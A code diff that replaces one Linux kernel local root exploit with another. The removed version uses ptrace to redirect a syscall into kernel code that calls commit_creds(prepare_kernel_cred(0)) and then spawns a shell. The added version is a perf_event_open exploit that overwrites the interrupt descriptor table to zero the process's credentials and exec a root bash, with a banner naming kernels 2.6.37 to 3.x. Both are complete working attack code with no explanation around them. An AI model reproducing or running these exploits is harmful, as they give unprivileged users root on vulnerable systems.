@@ -1,167 +1,78 @@
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/ptrace.h>
-#include <inttypes.h>
-#include <sys/reg.h>
-#include <unistd.h>
+#define _GNU_SOURCE 1
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/mman.h>
 #include <string.h>
-typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
-typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
-_commit_creds commit_creds;
-_prepare_kernel_cred prepare_kernel_cred;
-int kernelmodecode(void *file, void *vma)
-{
-commit_creds(prepare_kernel_cred(0));
-return -1;
-}
-unsigned long
-get_symbol(char *name)
-{
-FILE *f;
-unsigned long addr;
-char dummy;
-char sname[512];
-int ret = 0, oldstyle = 0;
-f = fopen("/proc/kallsyms", "r");
-if (f == NULL) {
-  f = fopen("/proc/ksyms", "r");
-  if (f == NULL)
-   return 0;
-  oldstyle = 1;
-}
-while (ret != EOF) {
-  if (!oldstyle) {
-   ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
-  } else {
-   ret = fscanf(f, "%p %s\n", (void **) &addr, sname);
-   if (ret == 2) {
-    char *p;
-    if (strstr(sname, "_O/") || strstr(sname, "_S.")) {
-     continue;
-    }
-    p = strrchr(sname, ''_'');
-    if (p > ((char *) sname + 5) && !strncmp(p - 3, "smp", 3)) {
-     p = p - 4;
-     while (p > (char *)sname && *(p - 1) == ''_'') {
-      p--;
-     }
-     *p = ''\0'';
-    }
-   }
-  }
-  if (ret == 0) {
-   fscanf(f, "%s\n", sname);
-   continue;
-  }
-  if (!strcmp(name, sname)) {
-   printf("ReS0lvEd sYmBoL %s 7o %p\n", name, (void *) addr);
-   fclose(f);
-   return addr;
+#include <unistd.h>
+#include <sys/mman.h>
+#include <syscall.h>
+#include <stdint.h>
+#include <assert.h>
+
+#define BASE  0x380000000
+#define SIZE  0x010000000
+#define KSIZE  0x2000000
+#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))
+
+void fuck() {
+  int i,j,k;
+  uint64_t uids[4] = { AB(2), AB(3), AB(4), AB(5) };
+  uint8_t *current = *(uint8_t **)(((uint64_t)uids) & (-8192));
+  uint64_t kbase = ((uint64_t)current)>>36;
+  uint32_t *fixptr = (void*) AB(1);
+  *fixptr = -1;
+
+  for (i=0; i<4000; i+=4) {
+    uint64_t *p = (void *)&current[i];
+    uint32_t *t = (void*) p[0];
+    if ((p[0] != p[1]) || ((p[0]>>36) != kbase)) continue;
+    for (j=0; j<20; j++) { for (k = 0; k < 8; k++)
+      if (((uint32_t*)uids)[k] != t[j+k]) goto next;
+      for (i = 0; i < 8; i++) t[j+i] = 0;
+      for (i = 0; i < 10; i++) t[j+9+i] = -1;
+      return;
+next:;    }
   }
 }
-fclose(f);
-return 0;
+
+void sheep(uint32_t off) {
+  uint64_t buf[10] = { 0x4800000001,off,0,0,0,0x300 };
+  int fd = syscall(298, buf, 0, -1, -1, 0);
+  assert(!close(fd));
 }
 
-static void docall(uint64_t *ptr, uint64_t size)
-{
-commit_creds = (_commit_creds) get_symbol("commit_creds");
-if (!commit_creds) {
-  printf("sYmb0l 74bl3 no7 ava1labLe, ab0r71n9! Fuck off\n");
-  exit(1);
-}
-prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
-if (!prepare_kernel_cred) {
-  printf("sYmb0l 74bl3 no7 ava1labLe, ab0r71n9! Fuck off\n");
-  exit(1);
-}
-        uint64_t tmp = ((uint64_t)ptr & ~0x00000000000FFF);
-printf("MaPpiNg at %lx\n", tmp);
-        if (mmap((void*)tmp, size, PROT_READ|PROT_WRITE|PROT_EXEC,
-                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
-                printf("mMap faUl7\n");
-                exit(1);
-        }
 
-        for (; (uint64_t) ptr < (tmp + size); ptr++)
-                *ptr = (uint64_t)kernelmodecode;
-
-        __asm__("\n"
-        "\tmovq $0x101, %rax\n"
-        "\tint $0x80\n");
-
-        printf("UID %d, EUID:%d GID:%d, EGID:%d\n", getuid(), geteuid(), getgid(), getegid());
-        execl("/bin/sh", "bin/sh", NULL);
-        printf("no /bin/sh ??fuck\n");
-        exit(0);
-}
-
-int main(int argc, char **argv)
-{
-        int pid, status, set = 0;
-        uint64_t rax;
-        uint64_t kern_s = 0xffffffff80000000;
-        uint64_t kern_e = 0xffffffff84000000;
-        uint64_t off = 0x0000000800000101 * 8;
-
-        if (argc == 4) {
-                docall((uint64_t*)(kern_s + off), kern_e - kern_s);
-                exit(0);
-        }
-
-        if ((pid = fork()) == 0) {
-                ptrace(PTRACE_TRACEME, 0, 0, 0);
-                execl(argv[0], argv[0], "2", "3", "4", NULL);
-                perror("exec fault");
-                exit(1);
-        }
-
-        if (pid == -1) {
-                printf("foRk FaUlt(\n");
-                exit(1);
-        }
-
-        for (;;) {
-                if (wait(&status) != pid)
-                        continue;
-
-                if (WIFEXITED(status)) {
-                        printf("Pr0ces5 fiNisHeD\n");
-                        break;
-                }
-
-                if (!WIFSTOPPED(status))
-                        continue;
-
-                if (WSTOPSIG(status) != SIGTRAP) {
-                        printf("ProCess rec3iveD si9naL: %d\n", WSTOPSIG(status));
-                        break;
-                }
-
-                rax = ptrace(PTRACE_PEEKUSER, pid, 8*ORIG_RAX, 0);
-                if (rax == 0x000000000101) {
-                        if (ptrace(PTRACE_POKEUSER, pid, 8*ORIG_RAX, off/8) == -1) {
-                                printf("PTRACE_POKEUSER fault\n");
-                                exit(1);
-                        }
-                        set = 1;
-                 //rax = ptrace(PTRACE_PEEKUSER, pid, 8*ORIG_RAX, 0);
-                }
-
-                if ((rax == 11) && set) {
-                        ptrace(PTRACE_DETACH, pid, 0, 0);
-                        for(;;)
-                                sleep(10000);
-                }
-
-                if (ptrace(PTRACE_SYSCALL, pid, 1, 0) == -1) {
-                        printf("PTRACE_SYSCALL fault\n");
-                        exit(1);
-                }
-        }
-
-        return 0;
+int  main() {
+  uint64_t  u,g,needle, kbase, *p; uint8_t *code;
+  uint32_t *map, j = 5;
+  int i;
+  struct {
+    uint16_t limit;
+    uint64_t addr;
+  } __attribute__((packed)) idt;
+  assert((map = mmap((void*)BASE, SIZE, 3, 0x32, 0,0)) == (void*)BASE);
+  memset(map, 0, SIZE);
+  sheep(-1); sheep(-2);
+  for (i = 0; i < SIZE/4; i++) if (map[i]) {
+    assert(map[i+1]);
+    break;
+  }
+  assert(i<SIZE/4);
+  asm ("sidt %0" : "=m" (idt));
+  kbase = idt.addr & 0xff000000;
+  u = getuid(); g = getgid();
+  assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
+  memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &fuck, 1024);
+  memcpy(code-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf",
+    printf("2.6.37-3.x x86_64\nsd@fucksheep.org 2010\n") % 27);
+  setresuid(u,u,u); setresgid(g,g,g);
+  while (j--) {
+    needle = AB(j+1);
+    assert(p = memmem(code, 1024, &needle, 8));
+    if (!p) continue;
+    *p = j?((g<<32)|u):(idt.addr + 0x48);
+  }
+  sheep(-i + (((idt.addr&0xffffffff)-0x80000000)/4) + 16);
+  asm("int $0x4");  assert(!setuid(0));
+  return execl("/bin/bash", "-sh", NULL);
 }
